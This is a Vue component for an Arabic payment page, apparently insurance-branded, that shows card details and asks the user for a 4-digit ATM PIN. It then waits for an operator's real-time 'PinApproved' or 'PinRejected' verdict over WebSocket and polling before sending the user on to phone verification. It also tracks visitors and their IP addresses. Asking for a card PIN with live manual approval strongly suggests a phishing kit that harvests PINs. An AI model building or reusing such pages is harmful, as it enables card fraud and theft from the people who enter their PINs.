<template>
    <div class="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 flex flex-col items-center justify-center py-4 sm:py-6 px-3 sm:px-4"
        dir="rtl">
        <div class="bg-white rounded-2xl shadow-lg border border-slate-100 overflow-hidden w-full"
            style="max-width: 400px">

            <!-- Header -->
            <div class="bg-gradient-to-l from-primary to-blue-700 py-3 sm:py-4 px-4">
                <h1 class="text-white text-base sm:text-lg font-bold text-center">
                    {{ t( 'verification.cardPin.title' ) }}
                </h1>
            </div>

            <!-- Content -->
            <div class="p-4 sm:p-6 md:p-8">
                <!-- Title & Icon -->
                <div class="text-center mb-4 sm:mb-6">
                    <img :src="pinAtmImg" alt="PIN" class="w-16 h-16 mx-auto mb-3 object-contain" width="64" height="64" />
                    <h2 class="text-lg sm:text-xl font-bold text-foreground">
                        {{ t( 'verification.cardPin.enterPin' ) }}
                    </h2>
                </div>

                <!-- Card Info -->
                <div class="bg-slate-50 rounded-xl p-4 mb-4 sm:mb-6 text-sm text-slate-700 space-y-2">
                    <div class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.cardPin.cardNumber' ) }}</span>
                        <span class="font-bold ltr-nums" dir="ltr">**** **** **** {{ cardLast4 }}</span>
                    </div>
                    <div v-if="cardHolder" class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.cardPin.cardHolder' ) }}</span>
                        <span class="font-bold uppercase">{{ cardHolder }}</span>
                    </div>
                    <div v-if="totalAmount > 0" class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.cardPin.amount' ) }}</span>
                        <span class="font-bold text-primary">
                            <SarIcon className="size-3 inline-block fill-primary" />
                            {{ formattedAmount }}
                        </span>
                    </div>
                </div>

                <!-- Waiting Loader Modal -->
                <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="primary" size="lg"
                    :text="t( 'verification.cardPin.verifyingPin' )"
                    :sub-text="t( 'verification.cardPin.waitingForApproval' )" />

                <!-- PIN Input -->
                <div class="mb-4 sm:mb-6">
                    <p class="block text-sm sm:text-base font-medium text-foreground text-center mb-3">
                        {{ t( 'verification.cardPin.pinLabel' ) }}
                        <span class="text-destructive">*</span>
                    </p>
                    <OtpInput ref="pinInputRef" v-model="pinCode" :length="4" :disabled="isVerifying" :error="error"
                        :auto-submit="true" @submit="submitPin" />
                </div>

                <!-- Submit Button -->
                <button :disabled="!isPinValid || isVerifying" class="w-full py-3 sm:py-3.5 rounded-xl font-bold text-sm sm:text-base transition-colors cursor-pointer flex items-center justify-center gap-2"
                    :class="isPinValid && !isVerifying
                        ? 'bg-primary hover:bg-primary-dark text-white'
                        : 'bg-slate-200 text-slate-400 cursor-not-allowed'"
                    @click="submitPin">
                    <svg v-if="isVerifying" class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none"
                        viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    <span>{{ isVerifying ? t( 'verification.cardPin.verifying' ) : t( 'verification.cardPin.confirm' ) }}</span>
                </button>

                <!-- Payment Logos & Trust Badges -->
                <div class="mt-6 sm:mt-8 pt-4 sm:pt-6 border-t border-slate-200">
                    <TrustBadges variant="inline" class="mb-4" />
                    <p class="text-center text-muted text-xs sm:text-sm mb-3 sm:mb-4">
                        {{ t( 'common.paymentBy' ) }}
                    </p>
                    <div class="flex items-center justify-center gap-3 sm:gap-4">
                        <img :src="visaLogo" alt="Visa"
                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
                        <img :src="mcLogo" alt="MasterCard"
                            class="h-[16px] sm:h-[20px] w-auto" width="32" height="20" />
                        <img :src="madaLogo" alt="Mada"
                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
                    </div>
                </div>
            </div>
        </div>

        <!-- Help Section -->
        <div class="mt-4 sm:mt-6 text-center px-4">
            <p class="text-xs sm:text-sm text-muted">
                {{ t( 'common.contactUsIfProblem' ) }}
                <a href="tel:920000000" class="text-secondary font-bold hover:underline text-sm sm:text-base mr-1">
                    920000000
                </a>
            </p>
        </div>

        <!-- Security Badge -->
        <div class="mt-3 sm:mt-4 flex items-center justify-center gap-2 text-slate-400">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span class="text-xs">{{ t( 'common.secureTransaction' ) }}</span>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getPinStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import TrustBadges from '@/components/ui/TrustBadges.vue';
import InsuranceLoader from '@/components/ui/InsuranceLoader.vue';
import visaLogo from '../../../images/logo/summary_logo/download (1).png';
import mcLogo from '../../../images/logo/summary_logo/download2.png';
import madaLogo from '../../../images/logo/summary_logo/download3.png';
import OtpInput from '@/components/ui/OtpInput.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import pinAtmImg from '@/../../resources/images/logo/summary_logo/pin_atm.png';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'card-pin' );

// ─── Load context via composable ────────────────────────────────────
const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
const sessionId = context.sessionId || '';
const customerIpRef = ref( context.customerIp || '' );
const cardLast4 = context.cardLast4 || '****';
const cardHolder = context.cardHolder || '';
const totalAmount = parseFloat( context.totalAmount ) || 0;

const formattedAmount = computed( () =>
{
    return totalAmount.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } );
} );

// ─── PIN State ──────────────────────────────────────────────────────
const pinCode = ref( '' );
const pinInputRef = ref( null );
const isVerifying = ref( false );
const hasSubmitted = ref( false );   // prevent double-submit across re-mounts
const error = ref( '' );

const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );

// ─── Submit PIN ─────────────────────────────────────────────────────
const submitPin = async () =>
{
    if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;

    isVerifying.value = true;
    hasSubmitted.value = true;
    error.value = '';

    const success = await submitPinApi( pinCode.value );

    if ( success )
    {
        logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
    } else
    {
        error.value = t( 'verification.cardPin.submitError' );
        isVerifying.value = false;
        hasSubmitted.value = false;
    }
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',       // PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
    approvedEvent: 'PinApproved',
    rejectedEvent: 'PinRejected',
    logTag: 'CardPin',

    onApproved ( event )
    {
        logger.debug( '[CardPin] Approved:', event );
        isVerifying.value = false;

        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'phoneVerification', router );
        } else
        {
            router.push( { name: 'phoneVerification' } );
        }
    },

    onRejected ( event )
    {
        logger.debug( '[CardPin] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
        pinCode.value = '';
        pinInputRef.value?.clear();
        hasSubmitted.value = false;
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.pin || '';
        if ( !isVerifying.value || !sig ) return;

        const { data } = await getPinStatus( sessionId, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'pin_other' } );
        }
    },
} );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    pinInputRef.value?.focusFirstEmpty();
    setupWs( ip );
} );
// WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
</script>
